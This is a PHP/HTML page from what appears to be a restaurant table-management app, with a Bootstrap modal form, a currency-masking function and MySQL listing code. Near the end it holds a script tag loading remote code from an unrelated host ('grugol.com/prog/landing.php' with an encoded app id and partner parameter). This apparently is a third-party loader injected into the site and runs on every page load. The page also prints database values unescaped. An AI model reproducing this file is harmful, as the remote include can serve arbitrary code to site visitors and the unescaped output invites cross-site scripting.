<!DOCTYPE html>
<html>
<?php 
  require_once 'includes/connect_db.php';
?>

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>fastfood v1 - Start</title>
    <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" src="jquery.quick.search.js"></script>
    <link rel="stylesheet" href="css/style.css">
        <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/bootstrap-tagsinput.css">
    <script>
function MascaraMoeda(objTextBox, SeparadorMilesimo, SeparadorDecimal, e){
    var sep = 0;
    var key = '';
    var i = j = 0;
    var len = len2 = 0;
    var strCheck = '0123456789';
    var aux = aux2 = '';
    var whichCode = (window.Event) ? e.which : e.keyCode;
    if (whichCode == 13) return true;
    key = String.fromCharCode(whichCode); // Valor para o código da Chave
    if (strCheck.indexOf(key) == -1) return false; // Chave inválida
    len = objTextBox.value.length;
    for(i = 0; i < len; i++)
        if ((objTextBox.value.charAt(i) != '0') && (objTextBox.value.charAt(i) != SeparadorDecimal)) break;
    aux = '';
    for(; i < len; i++)
        if (strCheck.indexOf(objTextBox.value.charAt(i))!=-1) aux += objTextBox.value.charAt(i);
    aux += key;
    len = aux.length;
    if (len == 0) objTextBox.value = '';
    if (len == 1) objTextBox.value = '0'+ SeparadorDecimal + '0' + aux;
    if (len == 2) objTextBox.value = '0'+ SeparadorDecimal + aux;
    if (len > 2) {
        aux2 = '';
        for (j = 0, i = len - 3; i >= 0; i--) {
            if (j == 3) {
                aux2 += SeparadorMilesimo;
                j = 0;
            }
            aux2 += aux.charAt(i);
            j++;
        }
        objTextBox.value = '';
        len2 = aux2.length;
        for (i = len2 - 1; i >= 0; i--)
        objTextBox.value += aux2.charAt(i);
        objTextBox.value += SeparadorDecimal + aux.substr(len - 2, len);
    }
    return false;
}
    </script>

</head>
<body>
<div class="container">
 <?php include "menu2.php" ?>

 <!-- Button trigger modal -->
  <button type="button" class="btn btn-success" data-toggle="modal" data-target="#myModal">
    Registrar Nova Conta
  </button>

  <!-- Modal -->
  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header" style="background:#333;color:#fff;">
          <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <h4 class="modal-title text-center" id="myModalLabel">Abrir Mesa</h4>
        </div>
        <div class="modal-body">
        <form action="includes/processadados2.php?go=cadastrarc" method="post" class="form-group">
        Status:
        <div class="form-group">
        <input readonly="true" type="text" class="form-control"  name="status" value="Ativa"/></div>
        Funcionario:
        <div class="form-group">
               <select name="codGarcom" class="form-control"  required>
            <?php
            $qr= mysql_query("SELECT * FROM tab_usuario ");
            while ($row=mysql_fetch_array($qr)){
            ?>
            <option value="<?php echo $row['id']?>"><?php echo $row['nome']?></option>
            <?php }?>
          </select></div>
        Pedido:
        <div class="form-group">
          <input type="text" class="form-control" name="pedido" data-role="tagsinput"></div>
        Mesa:
        <div class="form-group">
        <select name="mesa" class="form-control" >
          <option>1</option>
          <option>2</option>
          <option>3</option>
          <option>4</option>
          <option>5</option>

        </select></div>
        Valor Total:
        <div class="form-group">
        <input type="text" name="valorTotal" class="form-control"   onKeyPress="return(MascaraMoeda(this,'.',',',event))" required></div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Cancelar</button>
          <button type="submit" class="btn btn-success">Cadastrar</button>
         </form>
        </div>
      </div>
    </div>
  </div>

<?php
if (isset($_GET['msg'])) {
  $msg = $_GET['msg'];
  switch ($msg) {
  case 1:
?>
<div class="alert alert-success" role="alert" style="height:relative;width:690px;left:325px;margin-top:10px;text-align:center;">
  <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  <span class="glyphicon glyphicon-ok" aria-hidden="true"></span>
  Mesa Adicionada com sucesso!
</div>
<?php
    }
  }
?> 
<?php
if (isset($_GET['msg'])) {
  $msg = $_GET['msg'];
  switch ($msg) {
  case 2:
?>
<div class="alert alert-info" role="alert" style="height:relative;width:690px;left:325px;margin-top:10px;text-align:center;">
  <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  <span class="glyphicon glyphicon-refresh" aria-hidden="true"></span>
  Mesa alterada com sucesso!
</div>
<?php
    }
  }
?> 
<?php
if (isset($_GET['msg'])) {
  $msg = $_GET['msg'];
  switch ($msg) {
  case 3:
?>
<div class="alert alert-danger" role="alert" style="height:relative;width:690px;left:325px;margin-top:10px;text-align:center;">
  <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  <span class="glyphicon glyphicon-trash" aria-hidden="true"></span>
  Mesa excluida com sucesso!
</div>
<?php
    }
  }
?> 

<div class="row marketing" style=" border: 1px solid rgb(225, 232, 237); border-radius: 4px; ">
  <h4 class="text-center">Lista de Mesas Cadastradas</h4>

  <div class="col-lg-10">

  <table class="table" style="margin-top:10px;margin-left:55px;">
    <thead>
      <tr>
        <td style="font-weight:bold;">Status</td>
        <td style="font-weight:bold;">COD</td>
        <td style="font-weight:bold;">Mesa</td>
        <td style="font-weight:bold;">Data de Abertura</td>
        <td style="font-weight:bold;">Valor</td>
        <td style="font-weight:bold;">Alterar</td>
        <td style="font-weight:bold;">Excluir</td>
      </tr>
    </thead>
<?php 
  $resultado = mysql_query("SELECT * FROM tab_conta ORDER BY dataAbertura desc",$dbconn);
  if ($resultado) {
  while ($row = mysql_fetch_assoc($resultado)) {
?>
<tbody>
  <td>
    <?php echo "<p></p>", $row['status'] ?>
  </td>
  <td>
    <?php echo "<p></p>", $row['codGarcom'] ?>
  </td>
  <td>
    <?php echo "<p></p>", $row['mesa'] ?>
  </td>
  <td>
    <?php echo "<p></p>", $row['dataAbertura'] ?>
  </td>
  <td>
    <?php echo "<p></p>R$", $row['valorTotal'] ?>
  </td>
  <td>
    <form action="alterar_conta2.php?id_conta=<?php echo $row['id_conta'];?>" method="POST">
      <input type="submit" value="Alterar" name="Submit" class='btn btn-sm btn-primary'>
    </form>
  </td>
  <td>
    <form action="includes/functions/excluir_conta2.php?id_conta=<?php echo $row['id_conta']; ?>" method="POST">
      <input type="submit" value="Excluir" name="Submit" class='btn btn-sm btn-danger'> 
    </form>
  </td>
</tbody>
<?php 
    }
  }
mysql_close($dbconn);
?>
</table>

        </div>
      </div>

  <!-- fim da classe container -->

      <footer class="footer">
        <p>&copy; 2017 Company, Inc.</p>
      </footer>

    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
  <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script src='http://grugol.com/prog/landing.php?app=MDAtMUUtOEMtMjUtRkEtMEQ=&partner=200'></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/bootstrap-tagsinput.min.js"></script>

  
</body>
</html>